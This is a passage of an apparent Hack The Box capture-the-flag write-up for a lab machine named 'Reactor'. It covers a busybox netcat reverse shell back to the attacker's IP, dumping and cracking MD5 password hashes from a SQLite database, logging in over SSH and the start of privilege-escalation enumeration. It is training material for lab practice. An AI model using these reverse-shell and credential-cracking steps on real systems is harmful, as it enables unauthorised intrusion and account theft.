└─$ python3 poc.py "busybox nc 10.10.14.85 4444 -e /bin/sh"
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"4014292262"}
```

###### What is BusyBox?

**BusyBox** is a single, lightweight binary that bundles stripped-down versions of many standard Unix utilities (`ls`, `sh`, `wget`, etc.) into one executable.

It is commonly found on minimal Linux environments, such as:

- Embedded devices (IoT)
- Docker containers
- Stripped-down or hardened servers

###### Why It Matters in Pentesting

When attempting a reverse shell, standard implementations of `netcat` (`nc`) vary wildly across Linux distributions. Crucially, the **`-e` flag** (which executes a shell upon connection) is often compiled out for security reasons.

|**Binary**|**Has -e flag?**|**Notes**|
|---|---|---|
|**`netcat-traditional`**|**Yes**|Rare on modern systems due to security risks.|
|**`netcat-openbsd`**|**No**|Default on many modern distros (Ubuntu, Debian).|
|**`busybox nc`**|**Yes**|Highly reliable fallback; almost always supports `-e`.|

If you are going into a target blind and standard `nc` fails, `busybox nc` is a much safer assumption.

**Breakdown**

```
busybox nc <YOUR_IP> 4444 -e /bin/sh
```

- **`busybox nc`**: Forces the system to use BusyBox's specific, feature-rich version of netcat rather than the system's default version.
- **`<YOUR_IP> 4444`**: Connects back to your attacker machine on the specified port.
- **`-e /bin/sh`**: Attaches a Bourne shell to the connection, granting you interactive command-line access upon success.
<div align="center">
<br>
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement — SSH as engineer

### 4.1 Database Credential Extraction

The database was queried directly via `rce.py`.

**Command:** `python3 rce.py "sqlite3 /opt/reactor-app/reactor.db .tables"`

**Breakdown:**

- `sqlite3`
    - **Description:** SQLite command-line client
    - **Purpose:** Queries the SQLite database file found in the application directory.
- `/opt/reactor-app/reactor.db`
    - **Description:** Full path to the database file
    - **Purpose:** Targets the specific database file identified during file enumeration.
- `.tables`
    - **Description:** SQLite meta-command
    - **Purpose:** Lists all tables in the database without needing a full SQL query.

**Result:** `sensor_logs users` — two tables confirmed. `users` is the immediate target.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db .tables"
sensor_logs  users
```

**Command:** `python3 rce.py "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'"`

**Breakdown:**

- `SELECT * FROM users;`
    - **Description:** SQL query returning all rows and columns from the users table
    - **Purpose:** Dumps the full user table contents including any stored credentials.

**Result:**

```
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db 'SELECT * FROM users;'" 
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two accounts extracted with hashed passwords. Both hashes are 32 hexadecimal characters — consistent with MD5.



Strictly speaking, you can never be **100% certain** that a specific hash is MD5 just by looking at it. This is because different hashing algorithms can occasionally produce outputs that look identical in structure.

However, you can look for the highly specific **"fingerprint"** of an MD5 hash. MD5 hashes have a distinct length and character set.

Here is how you can identify them, along with the tools to do it automatically.

#### 1. The Visual Checklist (The Fingerprint)

An MD5 hash always follows these exact rules:

- **Length:** It is exactly **32 characters** long.
- **Character Set:** It uses **hexadecimal** characters. This means it only contains numbers (`0-9`) and the letters `a` through `f` (or uppercase `A-F`). It will never contain letters like _g, z, q,_ or _m_.
- **Bit-length:** It represents a 128-bit value.

> **Example of an MD5 hash:** `7a1920d61156abe05a60135eed333126`

If a string is 32 characters long and only contains `0-9` and `a-f`, there is a 99% chance it is an MD5 hash.

#### 2. How it compares to other common hashes

To help you tell them apart, look at how MD5 compares to other common hashes used for passwords and files:

|**Hash Type**|**Length (Characters)**|**Example**|
|---|---|---|
|**MD5**|**32**|`7a1920d61156abe05a60135eed333126`|
|**SHA-1**|**40**|`0408f3a3ca047720cf192131977d4f938b8098fa`|
|**SHA-256**|**64**|`6d67... (much longer) ...8a41`|
|**Bcrypt**|**60**|Starts with `$2a$`, `$2b$`, or `$2y$`|

#### 3. Automated Tools to Identify Hashes

Instead of counting characters manually, you can use tools that analyze the string and tell you exactly what it is.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ hashid a203b22191d744a4e70ada5c101b17b8
Analyzing 'a203b22191d744a4e70ada5c101b17b8'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

When you ran `hashid` on `a203b22191d744a4e70ada5c101b17b8`, the tool checked the **length** (32 characters) and the **character set** (hexadecimal). Because dozens of different hashing algorithms output exactly 32 hex characters, `hashid` is telling you:

> _"Hey, this string matches the physical blueprint for all of these 18 different hash types. It could be any one of them."_

However, in the context of HTB, CTFs, and real-world penetration testing, **95% of the time, it is going to be either MD5 or NTLM.** Here is how to narrow down that massive list and figure out what you are actually dealing with:

Look at where you found this hash in the "Reactor" machine. The source tells you almost everything:

- **Did you dump it from a Windows system (SAM hive, Active Directory, or NTDS.dit)?** It is almost certainly **NTLM** (Windows passwords).
- **Did you find it in a web application database, a URL parameter, or a configuration file?** It is highly likely **MD5**.
- **Did you find it in an old Windows XP/98 backup?** It might be **LM** (LanMan), but this is rare nowadays unless it's an intentionally retro machine.
<div align="center">
<br>
<br>
</div>

### 4.2 Hash Cracking

Both hashes were saved to `hashes.txt` and submitted to John the Ripper against the rockyou wordlist.

**Command:** `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

**Breakdown:**

- `john`
    - **Description:** John the Ripper — password hash cracking tool
    - **Purpose:** Attempts to recover plaintext passwords by hashing wordlist entries and comparing them against the target hashes.
- `--format=raw-md5`
    - **Description:** Hash format specifier
    - **Purpose:** Tells John to treat the input as unsalted raw MD5 hashes rather than attempting to auto-detect the format — prevents misidentification.
- `--wordlist=/usr/share/wordlists/rockyou.txt`
    - **Description:** Wordlist path
    - **Purpose:** Uses the rockyou wordlist — a 14 million entry dataset of real-world leaked passwords, standard for CTF and penetration testing.
- `hashes.txt`
    - **Description:** Input file containing the extracted hashes
    - **Purpose:** The two MD5 hashes extracted from the database.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ vi hashes.txt

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 DONE (2026-06-01 19:07) 0g/s 3866Kp/s 3866Kc/s 3866KC/s  fuckyooh21..*7¡Vamos!
Session completed. 
```


```
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ john --show --format=raw-md5 hashes.txt
?:reactor1

1 password hash cracked, 1 left
```

One hash cracked. The `?` prefix in John's `--show` output is a display placeholder that appears when username information was not stored alongside the hash in the input file. To determine which account the password belongs to, the MD5 of `reactor1` was computed and compared against both database hashes:

**Result:** `39d97110eafe2a9a68639812cd271e8e` — matching the **engineer** account exactly.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ echo -n "reactor1" | md5sum
39d97110eafe2a9a68639812cd271e8e  -
```
<div align="center">
<br>
<br>
</div>

### 4.3 SSH Login and User Flag

With the engineer credential confirmed, SSH access was established using the cracked password.

**Command:** `ssh engineer@TARGET_IP`

**Breakdown:**

- `ssh`
    - **Description:** Secure Shell client
    - **Purpose:** Establishes an authenticated, encrypted interactive session on the target over port 22 — confirmed open during initial port enumeration.
- `engineer@TARGET_IP`
    - **Description:** Username and target IP
    - **Purpose:** Authenticates as the `engineer` account using the password `reactor1` recovered from the database.

**Result:** Login successful. The server presented a custom MOTD banner confirming the target identity — `ReactorWatch Core Monitoring System, Nuclear Dynamics Corp. Site 7, AUTHORIZED PERSONNEL ONLY`.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ ssh engineer@10.129.13.245
engineer@10.129.13.245's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Mon Jun 1 23:25:56 2026 from 10.10.14.85
engineer@reactor:~$ pwd
/home/engineer
engineer@reactor:~$ cat user.txt 
e77a25392251881af2255213ee206176
engineer@reactor:~$ 
```

**USER FLAG:** `e77a25392251881af2255213ee206176`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 Process Enumeration

Standard privilege escalation checks were run immediately after gaining the shell.

**Command:** `sudo -l`

**Breakdown:**

- `sudo -l`
    - **Description:** Lists allowed sudo commands for the current user
    - **Purpose:** The fastest possible path to root — if `engineer` has any sudo rights, escalation may be trivial.

**Result:** `Sorry, user engineer may not run sudo on reactor.` — no sudo privileges. Escalation requires a different path.

```shell
engineer@reactor:~$ sudo -l
[sudo] password for engineer:                                                             
Sorry, user engineer may not run sudo on reactor.      
```

**Command:** `ps aux`

**Breakdown:**

- `ps`
    - **Description:** Process status utility
    - **Purpose:** Lists all currently running processes on the system.
- `a`
    - **Description:** Show processes for all users
    - **Purpose:** Surfaces processes owned by other users, including root — revealing services and daemons that may be exploitable.
- `u`
    - **Description:** User-oriented format
    - **Purpose:** Displays the owning username alongside each process, making it easy to identify privileged processes at a glance.
- `x`
    - **Description:** Include processes without a controlling terminal
    - **Purpose:** Captures background services and daemons that wouldn't appear in a standard `ps` listing.

**Result:** Full process list returned. Two entries of immediate interest were identified and isolated with a targeted grep:

```shell
engineer@reactor:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                
root           1  0.0  0.3  22040 13252 ?        Ss   Jun01   0:03 /sbin/init             
root           2  0.0  0.0      0     0 ?        S    Jun01   0:00 [kthreadd]             
root           3  0.0  0.0      0     0 ?        S    Jun01   0:00 [pool_workqueue_release
root           4  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-rcu_g]      
root           5  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-rcu_p]      
root           6  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-slub_]      
root           7  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-netns]      
root          12  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-mm_pe]      
root          13  0.0  0.0      0     0 ?        I    Jun01   0:00 [rcu_tasks_kthread]    
root          14  0.0  0.0      0     0 ?        I    Jun01   0:00 [rcu_tasks_rude_kthread
root          15  0.0  0.0      0     0 ?        I    Jun01   0:00 [rcu_tasks_trace_kthrea
root          16  0.0  0.0      0     0 ?        S    Jun01   0:00 [ksoftirqd/0]          
root          17  0.0  0.0      0     0 ?        I    Jun01   0:01 [rcu_preempt]          
root          18  0.0  0.0      0     0 ?        S    Jun01   0:00 [migration/0]          
root          19  0.0  0.0      0     0 ?        S    Jun01   0:00 [idle_inject/0]        
root          20  0.0  0.0      0     0 ?        S    Jun01   0:00 [cpuhp/0]              
root          21  0.0  0.0      0     0 ?        S    Jun01   0:00 [cpuhp/1]              
root          22  0.0  0.0      0     0 ?        S    Jun01   0:00 [idle_inject/1]        
root          23  0.0  0.0      0     0 ?        S    Jun01   0:00 [migration/1]          
root          24  0.0  0.0      0     0 ?        S    Jun01   0:00 [ksoftirqd/1]          
root          26  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/1:0H-events_hi
root          29  0.0  0.0      0     0 ?        S    Jun01   0:00 [kdevtmpfs]
root          30  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-inet_]
root          31  0.0  0.0      0     0 ?        S    Jun01   0:00 [kauditd]
root          33  0.0  0.0      0     0 ?        S    Jun01   0:00 [khungtaskd]
root          34  0.0  0.0      0     0 ?        S    Jun01   0:00 [oom_reaper]
root          37  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-write]
root          38  0.0  0.0      0     0 ?        S    Jun01   0:00 [kcompactd0]
root          39  0.0  0.0      0     0 ?        SN   Jun01   0:00 [ksmd]
root          42  0.0  0.0      0     0 ?        SN   Jun01   0:00 [khugepaged]
root          43  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-kinte]
root          44  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-kbloc]
root          45  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-blkcg]
root          46  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/9-acpi]
root          47  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-tpm_d]
root          48  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-ata_s]
root          49  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-md]
root          50  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-md_bi]
root          51  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-edac-]
root          52  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-devfr]
root          53  0.0  0.0      0     0 ?        S    Jun01   0:00 [watchdogd]
root          55  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-quota]
root          56  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/1:1H-kblockd]
root          57  0.0  0.0      0     0 ?        S    Jun01   0:00 [kswapd0]
root          58  0.0  0.0      0     0 ?        S    Jun01   0:00 [ecryptfs-kthread]
root          59  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-kthro]
root          60  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/24-pciehp]
root          61  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/25-pciehp]
root          62  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/26-pciehp]
root          63  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/27-pciehp]
root          64  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/28-pciehp]
root          65  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/29-pciehp]
root          66  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/30-pciehp]
root          67  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/31-pciehp]
root          68  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/32-pciehp]
root          69  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/33-pciehp]
root          70  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/34-pciehp]
root          71  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/35-pciehp]
root          72  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/36-pciehp]
root          73  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/37-pciehp]
root          74  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/38-pciehp]
root          75  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/39-pciehp]
root          76  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/40-pciehp]
root          77  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/41-pciehp]
root          78  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/42-pciehp]
root          79  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/43-pciehp]
root          80  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/44-pciehp]
root          81  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/45-pciehp]
root          82  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/46-pciehp]
root          83  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/47-pciehp]
root          84  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/48-pciehp]
root          85  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/49-pciehp]
root          86  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/50-pciehp]
root          87  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/51-pciehp]
root          88  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/52-pciehp]
root          89  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/53-pciehp]
root          90  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/54-pciehp]
root          91  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/55-pciehp]
root          92  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-acpi_]
root          93  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_0]
root          94  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root          95  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_1]
root          96  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         100  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-mld]
root         101  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-ipv6_]
root         103  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u256:1-ext4-rs
root         110  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-kstrp]
root         112  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/u259:0]
root         113  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/u260:0]
root         114  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/u261:0]
root         127  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-charg]
root         153  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/0:1H]
root         178  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-mpt_p]
root         179  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-mpt/0]
root         188  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_2]
root         190  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         191  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_3]
root         195  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         199  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_4]
root         200  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         201  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_5]
root         202  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         203  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_6]
root         204  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         206  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_7]
root         207  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         208  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_8]
root         209  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         210  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_9]
root         211  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         212  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_10]
root         213  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         214  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_11]
root         215  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         216  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_12]
root         217  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         218  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_13]
root         219  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         220  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_14]
root         221  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         222  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_15]
root         223  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         224  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_16]
root         225  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         226  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_17]
root         227  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         228  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_18]
root         229  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         230  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_19]
root         231  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         232  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_20]
root         233  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         234  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_21]
root         235  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         236  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_22]
root         237  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         238  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_23]
root         239  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         240  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_24]
root         241  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         242  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_25]
root         243  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         244  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_26]
root         245  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         246  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_27]
root         247  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         248  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_28]
root         249  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         250  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_29]
root         251  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         252  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_30]
root         253  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         254  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_31]
root         255  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         282  0.0  0.0      0     0 ?        S    Jun01   0:00 [scsi_eh_32]
root         283  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-scsi_]
root         296  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-kdmfl]
root         322  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-raid5]
root         355  0.0  0.0      0     0 ?        S    Jun01   0:00 [jbd2/dm-0-8]
root         356  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-ext4-]
root         404  0.0  1.0  99860 42628 ?        S<s  Jun01   0:02 /usr/lib/systemd/system
root         462  0.0  0.2  31064  9828 ?        Ss   Jun01   0:00 /usr/lib/systemd/system
root         466  0.0  0.0      0     0 ?        S    Jun01   0:00 [psimon]
root         550  0.0  0.0      0     0 ?        S    Jun01   0:00 [jbd2/sda2-8]
root         551  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-ext4-]
root         580  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/0:2H-kblockd]
systemd+     589  0.0  0.3  21588 12928 ?        Ss   Jun01   0:00 /usr/lib/systemd/system
systemd+     594  0.0  0.1  91028  7820 ?        Ssl  Jun01   0:01 /usr/lib/systemd/system
root         600  0.0  0.0  85576  2832 ?        D<sl Jun01   0:01 /sbin/auditd
_laurel      605  0.0  0.1  10112  6492 ?        S<   Jun01   0:02 /usr/local/sbin/laurel 
root         650  0.0  0.0      0     0 ?        S    Jun01   0:00 [audit_prune_tree]
root         682  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/60-vmw_vmci]
root         685  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/61-vmw_vmci]
root         686  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/62-vmw_vmci]
root         712  0.0  0.0      0     0 ?        S    Jun01   0:00 [irq/16-vmwgfx]
root         713  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-ttm]
root         723  0.0  0.3  53468 12080 ?        Ss   Jun01   0:00 /usr/bin/VGAuthService
root         725  0.1  0.2 317200 10676 ?        Ssl  Jun01   0:15 /usr/bin/vmtoolsd
root         734  0.0  0.0   4068  3244 ?        Ss   Jun01   0:00 dhclient -1 -4 -v -i -p
root         768  0.0  0.0      0     0 ?        I<   Jun01   0:00 [kworker/R-crypt]
message+     786  0.0  0.1   9856  5556 ?        Ss   Jun01   0:00 @dbus-daemon --system -
polkitd      828  0.0  0.1 308164  7844 ?        Ssl  Jun01   0:00 /usr/lib/polkit-1/polki
root         904  0.0  0.2  18156  8844 ?        Ss   Jun01   0:00 /usr/lib/systemd/system
root         911  0.0  0.3 468980 13576 ?        Ssl  Jun01   0:00 /usr/libexec/udisks2/ud
root         979  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u256:2-ext4-rs
syslog       995  0.0  0.1 222508  7316 ?        Ssl  Jun01   0:01 /usr/sbin/rsyslogd -n -
root        1150  0.0  0.3 392032 12664 ?        Ssl  Jun01   0:00 /usr/sbin/ModemManager
root        1378  0.0  0.0   6824  2860 ?        Ss   Jun01   0:00 /usr/sbin/cron -f -P
node        1379 15.1  3.8 11813800 153924 ?     Ssl  Jun01  32:09 next-server (v15.0.3)
root        1387  0.0  1.2 1067348 48416 ?       Ssl  Jun01   0:01 /usr/bin/node --inspect
root        1402  0.0  0.0   6104  2000 tty1     Ss+  Jun01   0:00 /sbin/agetty -o -p -- \
node        1486  0.0  0.0   2800  1680 ?        S    Jun01   0:00 /bin/sh
root        1499  0.0  0.2  12024  8268 ?        Ss   Jun01   0:00 sshd: /usr/sbin/sshd -D
root        1729  0.0  0.0      0     0 ?        S    Jun01   0:00 [psimon]
engineer    1731  0.0  0.2  20320 11348 ?        Ss   Jun01   0:00 /usr/lib/systemd/system
engineer    1733  0.0  0.0  21152  3580 ?        S    Jun01   0:00 (sd-pam)
root        1788  0.0  0.2  14736 10396 ?        Ss   Jun01   0:00 sshd: engineer [priv]
engineer    1792  0.0  0.1  14960  7036 ?        S    Jun01   0:00 sshd: engineer
root        1866  0.0  1.0 479360 42836 ?        Ssl  Jun01   0:01 /usr/libexec/fwupd/fwup
root        1873  0.0  0.2 313964  8960 ?        Ssl  Jun01   0:00 /usr/libexec/upowerd
root        2208  0.0  0.0      0     0 ?        I    Jun01   0:01 [kworker/1:2-events]
root        2250  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u257:2-flush-2
root        2254  0.0  0.0      0     0 ?        I    Jun01   0:01 [kworker/0:0-events]
root        2278  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u258:0-events_
root        2303  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u257:0-flush-2
root        2324  0.0  0.2  14964 10532 ?        Ss   Jun01   0:00 sshd: engineer [priv]
engineer    2328  0.0  0.1  14964  7092 ?        S    Jun01   0:00 sshd: engineer@pts/0
engineer    2329  0.0  0.1   8648  5672 pts/0    Ss   Jun01   0:00 -bash
root        2346  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/1:1-rcu_par_gp
root        2352  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u258:2-events_
root        2359  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u258:3-events_
root        2367  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/0:1-cgroup_fre
root        2368  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u257:1-flush-2
root        2395  0.0  0.0      0     0 ?        I    Jun01   0:00 [kworker/u258:1-events_
root        2409  0.0  0.0      0     0 ?        I    00:00   0:00 [kworker/1:0-rcu_par_gp
root        2410  0.0  0.0      0     0 ?        I    00:00   0:00 [kworker/1:3-rcu_par_gp
root        2415  0.0  0.0      0     0 ?        I    00:00   0:00 [kworker/0:2]
engineer    2417  200  0.1  10884  4560 pts/0    R+   00:01   0:00 ps aux
```

**Command:** `ps aux | grep node`

**Result:**

```shell
engineer@reactor:~$ ps aux | grep node
